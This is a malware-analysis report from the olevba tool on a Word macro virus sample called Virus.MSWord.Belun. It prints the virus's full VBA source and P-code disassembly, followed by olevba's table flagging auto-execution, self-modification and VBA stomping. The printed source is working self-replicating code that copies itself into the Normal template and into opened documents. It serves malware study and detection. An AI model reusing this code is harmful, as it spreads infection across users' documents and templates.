olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Belun
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Belun - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO uebel.bas 
in file: Virus.MSWord.Belun - OLE stream: 'Macros/VBA/uebel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    IstMirSchlecht
End Sub
Sub IstMirSchlecht()
'On Error Resume Next
Set Norm = NormalTemplate.VBProject.VBComponents
Set Acti = ActiveDocument.VBProject.VBComponents
Const ActiveModulName = "uebel"

For i = 1 To Norm.Count
    If Norm(i).Name = ActiveModulName Then NormIns = True
    If Norm(i).Name = "Modul1" And NormIns = False Then KillSomeNormModul = True
Next

For i = 1 To Acti.Count
    If Acti(i).Name = ActiveModulName Then ActIns = True
    If Acti(i).Name = "Modul1" And ActIns = False Then KillSomeActModul = True
Next

If KillSomeNormModul = True Then
    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Modul1", Object:=wdOrganizerObjectProjectItems
End If

If KillSomeActModul = True Then
    Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Modul1", Object:=wdOrganizerObjectProjectItems
End If

If NormIns = False Then
    CheckRefNormal
    Norm.Add (vbext_ct_StdModule)
    Norm("Modul1").Name = ActiveModulName
    ActiveLines = ActiveDocument.VBProject.VBComponents(ActiveModulName).CodeModule.CountOfLines
    ActContent = ActiveDocument.VBProject.VBComponents(ActiveModulName).CodeModule.Lines(1, ActiveLines)
    Norm(ActiveModulName).CodeModule.AddFromString (ActContent)
    NormalTemplate.Save
End If
    
If ActIns = False Then
    CheckRefActive
    Acti.Add (vbext_ct_StdModule)
    Acti("Modul1").Name = ActiveModulName
    NormLines = NormalTemplate.VBProject.VBComponents(ActiveModulName).CodeModule.CountOfLines
    NormContent = NormalTemplate.VBProject.VBComponents(ActiveModulName).CodeModule.Lines(1, NormLines)
    Acti(ActiveModulName).CodeModule.AddFromString (NormContent)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Function CheckRefNormal()
CheckRefNormal = False

For i = 1 To NormalTemplate.VBProject.References.Count
    If NormalTemplate.VBProject.References(i).Name = "VBIDE" Then CheckRefNormal = True
Next

If CheckRefNormal = False Then
    NormalTemplate.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive()
CheckRefActive = False

For i = 1 To ActiveDocument.VBProject.References.Count
    If ActiveDocument.VBProject.References(i).Name = "VBIDE" Then CheckRefActive = True
Next

If CheckRefActive = False Then
    ActiveDocument.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Belun
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1586 bytes
' Macros/VBA/uebel - 6220 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	ArgsCall IstMirSchlecht 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub IstMirSchlecht())
' Line #4:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #5:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Norm 
' Line #6:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Acti 
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x0005 "uebel"
' 	VarDefn ActiveModulName
' Line #8:
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Norm 
' 	MemLd Count 
' 	For 
' Line #10:
' 	Ld i 
' 	ArgsLd Norm 0x0001 
' 	MemLd New 
' 	Ld ActiveModulName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormIns 
' 	EndIf 
' Line #11:
' 	Ld i 
' 	ArgsLd Norm 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Modul1"
' 	Eq 
' 	Ld NormIns 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KillSomeNormModul 
' 	EndIf 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Acti 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	ArgsLd Acti 0x0001 
' 	MemLd New 
' 	Ld ActiveModulName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActIns 
' 	EndIf 
' Line #16:
' 	Ld i 
' 	ArgsLd Acti 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Modul1"
' 	Eq 
' 	Ld ActIns 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KillSomeActModul 
' 	EndIf 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' Line #19:
' 	Ld KillSomeNormModul 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Modul1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #21:
' 	EndIfBlock 
' Line #22:
' Line #23:
' 	Ld KillSomeActModul 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Modul1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Ld NormIns 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #28:
' 	ArgsCall CheckRefNormal 0x0000 
' Line #29:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld Norm 
' 	ArgsMemCall Add 0x0001 
' Line #30:
' 	Ld ActiveModulName 
' 	LitStr 0x0006 "Modul1"
' 	ArgsLd Norm 0x0001 
' 	MemSt New 
' Line #31:
' 	Ld ActiveModulName 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld ActiveLines 
' 	Ld ActiveModulName 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ActContent 
' Line #33:
' 	Ld ActContent 
' 	Paren 
' 	Ld ActiveModulName 
' 	ArgsLd Norm 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #34:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	Ld ActIns 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #38:
' 	ArgsCall CheckRefActive 0x0000 
' Line #39:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld Acti 
' 	ArgsMemCall Add 0x0001 
' Line #40:
' 	Ld ActiveModulName 
' 	LitStr 0x0006 "Modul1"
' 	ArgsLd Acti 0x0001 
' 	MemSt New 
' Line #41:
' 	Ld ActiveModulName 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NormLines 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld NormLines 
' 	Ld ActiveModulName 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NormContent 
' Line #43:
' 	Ld NormContent 
' 	Paren 
' 	Ld ActiveModulName 
' 	ArgsLd Acti 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Function CheckRefNormal())
' Line #50:
' 	LitVarSpecial (False)
' 	St CheckRefNormal 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd References 
' 	MemLd Count 
' 	For 
' Line #53:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd References 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "VBIDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CheckRefNormal 
' 	EndIf 
' Line #54:
' 	StartForVariable 
' 	Next 
' Line #55:
' Line #56:
' 	Ld CheckRefNormal 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd References 
' 	ArgsMemCall AddFromGuid 0x0003 
' Line #58:
' 	EndIfBlock 
' Line #59:
' Line #60:
' 	EndFunc 
' Line #61:
' Line #62:
' 	FuncDefn (Function CheckRefActive())
' Line #63:
' 	LitVarSpecial (False)
' 	St CheckRefActive 
' Line #64:
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd References 
' 	MemLd Count 
' 	For 
' Line #66:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd References 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "VBIDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CheckRefActive 
' 	EndIf 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' Line #69:
' 	Ld CheckRefActive 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LitStr 0x0026 "{0002E157-0000-0000-C000-000000000046}"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd References 
' 	ArgsMemCall AddFromGuid 0x0003 
' Line #71:
' 	EndIfBlock 
' Line #72:
' Line #73:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

